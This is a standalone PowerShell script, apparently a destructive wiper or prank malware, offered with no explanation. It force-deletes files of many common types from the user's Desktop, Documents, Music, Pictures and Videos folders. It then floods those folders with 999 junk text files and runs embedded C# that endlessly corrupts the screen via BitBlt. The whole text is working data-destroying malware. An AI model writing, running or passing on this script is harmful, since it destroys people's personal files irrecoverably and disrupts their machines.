$desktopPath = [Environment]::GetFolderPath("Desktop")
$documentsPath = [Environment]::GetFolderPath("MyDocuments")
$musicPath = [Environment]::GetFolderPath("MyMusic")
$picturesPath = [Environment]::GetFolderPath("MyPictures")
$videosPath = [Environment]::GetFolderPath("MyVideos")

$extensionsToDelete = @("exe", "json", "doc", "pdf", "wpd", "docx", "rtf", "tex", "odt", "jpg", "jpeg", "mp3", "rar", "vcd", "webp", "css", "html", "py", "php", "ico", "lnk", "mp4", "js", "bak", "xml", "zip", "bmp")

$pathsToDelete = @($desktopPath, $documentsPath, $musicPath, $picturesPath, $videosPath)

foreach ($path in $pathsToDelete) {
    foreach ($extension in $extensionsToDelete) {
        $filesToDelete = Get-ChildItem -Path $path -Filter "*.$extension" -File

        foreach ($file in $filesToDelete) {
            $filePath = $file.FullName
            Write-Host "Deleting file: $filePath"
            Remove-Item -Path $filePath -Force
        }
    }

    for ($i = 1; $i -le 999; $i++) {
        $randomIteration = Get-Random -Minimum 100 -Maximum 1000
        $newFileName = "⓿⌓⓿_$randomIteration.txt"
        $newFilePath = Join-Path -Path $path -ChildPath $newFileName
        New-Item -Path $newFilePath -ItemType File -Force | Out-Null
    }
}

$source = @"
using System;
using System.Runtime.InteropServices;
using System.Threading;

public static class Win32
{
    [DllImport("user32.dll")]
    static extern int GetSystemMetrics(int smIndex);

    [DllImport("user32.dll")]
    static extern IntPtr GetDC(IntPtr hWnd);

    [DllImport("gdi32.dll")]
    static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

    [DllImport("user32.dll", SetLastError = true)]
    static extern bool SetProcessDPIAware();

    public static void ReversePIP()
    {
        SetProcessDPIAware();
        int cx = GetSystemMetrics(0);
        int cy = GetSystemMetrics(1);

        while (true)
        {
            Thread.Sleep(800);
            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr hdcSrc = GetDC(IntPtr.Zero);

            BitBlt(hdc, cx - 100, cy - 100, 100, 100, hdcSrc, 0, 0, 0x00CC0020);
        }
    }
}
"@

Add-Type -TypeDefinition $source -Language CSharp
[Win32]::ReversePIP()
